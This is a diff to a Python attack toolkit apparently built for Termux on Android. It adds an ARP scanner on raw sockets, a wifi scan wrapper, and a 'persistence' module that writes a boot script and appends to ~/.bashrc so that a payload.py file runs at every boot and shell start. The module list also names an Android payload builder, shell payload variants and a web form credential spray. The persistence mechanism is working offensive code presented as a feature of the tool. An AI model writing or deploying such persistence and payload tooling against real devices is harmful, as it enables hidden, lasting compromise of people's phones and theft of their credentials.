@@ -8,7 +8,7 @@ try:
 except ImportError:
     _TERMIOS = False
 
-VERSION = "0.3.3"
+VERSION = "0.3.4"
 ROOT = os.path.dirname(os.path.abspath(__file__))
 DATA = os.path.join(ROOT, "data"); os.makedirs(DATA, exist_ok=True)
 CFG = os.path.join(ROOT, "config.json")
@@ -416,6 +416,58 @@ def mod_discover():
     print(f"up ({len(found)}): {sorted(found) or 'none'}")
     if found: save("lan", cidr, f"up={sorted(found)}")
 
+# ---------------- ARP scan (needs root) ----------------
+def mod_arp():
+    section("ARP SCAN (raw socket, needs root)")
+    cidr = ask(f"cidr [{D.get('cidr', '192.168.1.0/24')}]: ").strip() or D.get("cidr", "192.168.1.0/24")
+    interface = ask("interface [wlan0]: ").strip() or "wlan0"
+    try:
+        net, mask = cidr.split("/"); mask = int(mask)
+        base = [int(x) for x in net.split(".")]
+    except ValueError: print("bad cidr"); return
+    if not (0 <= mask <= 32): print("bad cidr"); return
+    h = 2**(32 - mask) - 2
+    if not (0 < h <= 2048): print("bad range"); return
+    if mask <= 8: print("mask too wide"); return
+    ips = [net2ip(base, i) for i in range(1, h + 1)]
+    import struct
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
+    except (OSError, AttributeError) as e:
+        print(f"no AF_PACKET: {e} (Linux raw socket, need root)"); return
+    mymac = b"\x02" * 6  # fallback: fabricate
+    try:
+        import fcntl
+        r = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", interface[:16].encode()))
+        mymac = r[18:24]
+    except Exception:
+        pass
+    s.bind((interface, 0))
+    eth = mymac + mymac + b"\x08\x06"
+    req = eth + b"\x00\x01\x08\x00" + b"\x06\x04" + b"\x00\x01" + mymac + socket.inet_aton(net2ip(base, 1)) + b"\x00" * 6
+    found = []
+    def arp_req(ip):
+        pkt = req + socket.inet_aton(ip)
+        try: s.send(pkt)
+        except OSError: pass
+    for ip in ips: arp_req(ip)
+    time.sleep(0.8)
+    s.settimeout(0.15)
+    try:
+        while True:
+            data, _ = s.recvfrom(2048)
+            if len(data) >= 42 and data[14:16] == b"\x00\x01" and data[20:22] == b"\x00\x02":
+                m = ":".join(f"{b:02x}" for b in data[6:12])
+                ip = socket.inet_ntoa(data[28:32])
+                if ip not in {x for _, x in found}: found.append((m, ip))
+    except (socket.timeout, OSError):
+        pass
+    s.close()
+    for m, ip in sorted(found, key=lambda x: socket.inet_aton(x[1])):
+        print(f"  {ip}  {m}")
+    print(f"ARP found ({len(found)})")
+    if found: save("arp", cidr, f"found={found}")
+
 # ---------------- device ops ----------------
 def _tapi(cmd, *args, timeout=15):
     try:
@@ -461,6 +513,41 @@ def mod_ops():
             except Exception as e: print(f"  {k}: err {e}")
         print("done"); return
     (ACT.get(ch) or (lambda: print("no op")))()
+
+# ---------------- wifi audit ----------------
+def mod_wifi():
+    section("WIFI AUDIT (termux-api scan + connection)")
+    if not tapi_ok():
+        print("termux-api NOT installed. Run:  pkg install termux-api")
+        return
+    def scan():
+        raw = _tapi("wifi-scaninfo")
+        if not raw: print("no scan info (wifi off?)"); return
+        print(raw[:800])
+    def conn():
+        print(_tapi("wifi-connectioninfo") or "no connection")
+    ch = ask("[s]can  [c]onnection-info  [q]uit: ").strip().lower()
+    if ch == "s": scan()
+    elif ch == "c": conn()
+    else: print("no op")
+
+# ---------------- persistence ----------------
+def mod_persist():
+    section("PERSISTENCE (termux boot + shell hook)")
+    import getpass
+    home = os.path.expanduser("~")
+    cmd = ask("on-boot cmd [%s]: " % f"cd {ROOT} && python3 {ROOT}/data/payload.py").strip() or f"cd {ROOT} && python3 {ROOT}/data/payload.py"
+    y = ask("apply? [y/N] ").strip().lower() == "y"
+    if not y: print("skipped"); return
+    boot = os.path.join(home, ".termux", "boot"); os.makedirs(boot, exist_ok=True)
+    bootf = os.path.join(boot, "hkall.sh")
+    try:
+        with open(bootf, "w") as f: f.write(f'#!/data/data/com.termux/files/usr/bin/sh\n{cmd}\n')
+        rc = os.path.join(home, ".bashrc")
+        with open(rc, "a") as f: f.write(f"\n# hkall persistence\n{cmd}\n")
+        print(f"persist -> {bootf} + ~/.bashrc")
+    except Exception as e:
+        print(f"persist error: {e}")
 
 # ---------------- serve + spray ----------------
 def mod_serve():
@@ -560,6 +647,9 @@ MODULES = {
     "payload": ("Android payload builder", mod_payload, True),
     "exe2": ("Shell payload variants", mod_py2exe, True),
     "lan": ("LAN host discoverer", mod_discover, True),
+    "arp": ("ARP scan (root)", mod_arp, True),
+    "wifi": ("Wifi audit (termux-api)", mod_wifi, True),
+    "persist": ("Persistence (boot+hook)", mod_persist, True),
     "ops": ("Device ops (termux-api)", mod_ops, True),
     "serve": ("HTTP static server", mod_serve, True),
     "spray": ("Web form credential spray", mod_spray, True),
